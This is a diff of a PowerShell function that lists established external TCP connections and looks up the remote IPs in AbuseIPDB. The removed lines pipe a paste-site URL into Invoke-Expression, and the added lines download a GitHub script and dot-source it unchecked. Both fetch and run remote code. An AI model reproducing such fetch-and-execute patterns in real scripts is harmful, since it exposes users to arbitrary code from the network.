@@ -1,136 +1,105 @@
 function Get-NetStatInfo {
-    [CmdletBinding()]
+    <#
+    .SYNOPSIS
+        Lists established external TCP connections and optionally enriches remote IPs with AbuseIPDB data.
+
+    .DESCRIPTION
+        Returns clean objects suitable for CSV export.
+        Downloads and dot-sources Start-AbuseIPDBLookup from GitHub before enrichment.
+
+    .PARAMETER MaxAgeInDays
+        How far back AbuseIPDB should look.
+
+    .PARAMETER TimeoutSec
+        Request timeout in seconds.
+
+    .PARAMETER SkipAbuseIPDBLookup
+        Skip enrichment calls to AbuseIPDB.
+
+    .EXAMPLE
+        Get-NetStatInfo | Export-Csv -Path C:\net.csv -NoTypeInformation -Encoding UTF8 -Force
+    #>
+
+        [CmdletBinding()]
     param(
         [int]$MaxAgeInDays = 90,
-        [int]$TimeoutSec = 10
+        [int]$TimeoutSec = 10,
+        [switch]$SkipAbuseIPDBLookup
     )
 
-    
-        $Url = "https://pastee.dev/r/cEBebaDW"
-        Invoke-RestMethod $Url | Invoke-Expression
-    
-    $ApiKey = $env:ABUSEIPDB
+    # Load Start-AbuseIPDBLookup from GitHub (always attempt)
+    $LookupUri  = "https://raw.githubusercontent.com/Andreas6920/BlueTrace/main/modules/Start-AbuseIPDBLookup.ps1"
+    $LookupPath = Join-Path $env:ProgramData "AM\Modules\Start-AbuseIPDBLookup.ps1"
 
-    if (-not $ApiKey) {
-        $SecureKey = Read-Host -AsSecureString "Enter your AbuseIPDB API key"
-        $ApiKey = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
-            [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecureKey)
-        )
-    }
-
-    if (-not $ApiKey) {
-        Write-Warning "No AbuseIPDB API key available. Enrichment will be skipped."
-    }
-
-    # ----------------------------
-    # Online check
-    # ----------------------------
+    $LookupAvailable = $false
     try {
-        $ThisMachineIsOnline = Test-Connection -ComputerName 1.1.1.1 -Count 1 -Quiet -ErrorAction Stop
+        $dir = Split-Path -Parent $LookupPath
+        if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
+
+        if (-not (Test-Path $LookupPath)) {
+            Invoke-RestMethod -Uri $LookupUri -ErrorAction Stop |
+                Set-Content -Path $LookupPath -Encoding UTF8 -Force
+        }
+
+        . $LookupPath
+
+        if (Get-Command Start-AbuseIPDBLookup -CommandType Function -ErrorAction SilentlyContinue) {
+            $LookupAvailable = $true
+        }
     }
     catch {
+        $LookupAvailable = $false
+    }
+
+    # Online check
+    $ThisMachineIsOnline = $false
+    try {
+        $ThisMachineIsOnline = Test-Connection -ComputerName 1.1.1.1 -Count 1 -Quiet -ErrorAction Stop
+    } catch {
         $ThisMachineIsOnline = $false
     }
 
-    # ----------------------------
-    # AbuseIPDB cache
-    # ----------------------------
-    $AbuseCache = @{}
-
-    # ----------------------------
-    # AbuseIPDB lookup helper
-    # ----------------------------
-    function Get-AbuseIpDbCheck {
-        param(
-            [string]$IpAddress
-        )
-
-        if (-not ([ipaddress]::TryParse($IpAddress, [ref]$null))) {
-            return $null
-        }
-
-        $Uri = "https://api.abuseipdb.com/api/v2/check?ipAddress=$IpAddress&maxAgeInDays=$MaxAgeInDays"
-        $Headers = @{
-            Key    = $ApiKey
-            Accept = 'application/json'
-        }
-
-        try {
-            $Response = Invoke-RestMethod -Uri $Uri -Headers $Headers -Method Get -TimeoutSec $TimeoutSec -ErrorAction Stop
-
-            [PSCustomObject]@{
-                Domain        = $Response.data.domain
-                ISP           = $Response.data.isp
-                Country       = $Response.data.countryCode
-                AbuseScore    = $Response.data.abuseConfidenceScore
-                TotalReports  = $Response.data.totalReports
-                LastReported  = $Response.data.lastReportedAt
-                Error         = $null
-            }
-        }
-        catch {
-            [PSCustomObject]@{
-                Domain        = $null
-                ISP           = $null
-                Country       = $null
-                AbuseScore    = $null
-                TotalReports  = $null
-                LastReported  = $null
-                Error         = $_.Exception.Message
-            }
-        }
-    }
-
-    # ----------------------------
     # Collect connections
-    # ----------------------------
-    $Connections = Get-NetTCPConnection -ErrorAction SilentlyContinue |
+    $connections = Get-NetTCPConnection -ErrorAction SilentlyContinue |
         Where-Object {
-            $_.State -eq 'Established' -and
+            $_.State -eq "Established" -and
             $_.RemoteAddress -and
             $_.RemoteAddress -notmatch '^(::|::1|0\.0\.0\.0|127\.0\.0\.1)$'
         }
 
-    if (-not $Connections) {
-        Write-Verbose "No external established TCP connections found."
-        return
-    }
+    if (-not $connections) { return }
 
-    # ----------------------------
-    # Build result set
-    # ----------------------------
-    $Results = foreach ($Conn in $Connections) {
+    # AbuseIPDB cache (per unique IP)
+    $AbuseCache = @{}
 
-        $Proc = Get-Process -Id $Conn.OwningProcess -ErrorAction SilentlyContinue
-        $RemoteIP = [string]$Conn.RemoteAddress
+    $results = foreach ($conn in $connections) {
 
-        $Abuse = $null
-        if ($ThisMachineIsOnline -and $ApiKey) {
-            if (-not $AbuseCache.ContainsKey($RemoteIP)) {
-                $AbuseCache[$RemoteIP] = Get-AbuseIpDbCheck -IpAddress $RemoteIP
+        $proc = Get-Process -Id $conn.OwningProcess -ErrorAction SilentlyContinue
+        $remoteIp = [string]$conn.RemoteAddress
+
+        $abuse = $null
+        if (-not $SkipAbuseIPDBLookup -and $ThisMachineIsOnline -and $LookupAvailable) {
+            if (-not $AbuseCache.ContainsKey($remoteIp)) {
+                $AbuseCache[$remoteIp] = Start-AbuseIPDBLookup -IpAddress $remoteIp -MaxAgeInDays $MaxAgeInDays -TimeoutSec $TimeoutSec
             }
-            $Abuse = $AbuseCache[$RemoteIP]
+            $abuse = $AbuseCache[$remoteIp]
         }
 
         [PSCustomObject]@{
-            DestinationIP   = $RemoteIP
-            DestinationPort = $Conn.RemotePort
-            State           = $Conn.State
-            PID             = $Conn.OwningProcess
-            ProcessName     = if ($Proc) { $Proc.ProcessName } else { "N/A" }
+            DestinationIP   = $remoteIp
+            DestinationPort = $conn.RemotePort
+            State           = $conn.State
+            PID             = $conn.OwningProcess
+            ProcessName     = if ($proc) { $proc.ProcessName } else { "N/A" }
 
-            Domain          = $Abuse.Domain
-            ISP             = $Abuse.ISP
-            Country         = $Abuse.Country
-            AbusedReports   = $Abuse.TotalReports
-            ConfidenceScore = $Abuse.AbuseScore
-            LastReportedAt  = $Abuse.LastReported
-            AbuseLookupErr  = $Abuse.Error
+            Domain          = $abuse.Domain
+            ISP             = $abuse.ISP
+            Country         = $abuse.Country
+            AbusedReports   = $abuse.TotalReports
+            ConfidenceScore = $abuse.AbuseScore
+            LastReportedAt  = $abuse.LastReportedAt
+            AbuseLookupErr  = $abuse.Error
         }
     }
 
-    # ----------------------------
-    # Output
-    # ----------------------------
-    $Results | Sort-Object ISP, Domain
-}
+    $results | Sort-Object ISP, Domain, DestinationIP, DestinationPort}
